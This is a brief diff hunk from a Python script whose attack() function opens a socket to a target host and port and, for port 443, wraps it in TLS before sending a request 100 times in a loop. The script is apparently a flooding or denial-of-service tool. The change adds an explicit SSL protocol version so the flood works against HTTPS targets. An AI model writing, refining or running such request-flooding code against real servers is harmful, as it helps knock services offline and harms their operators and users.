@@ -101,7 +101,7 @@ def attack():
         s.connect((ip, port))
 
         if port == 443:
-            x = ssl.wrap_socket(s)
+            x = ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_SSLv23)
             try:
                 for i in range (100):
                     x.send(str.encode(request))
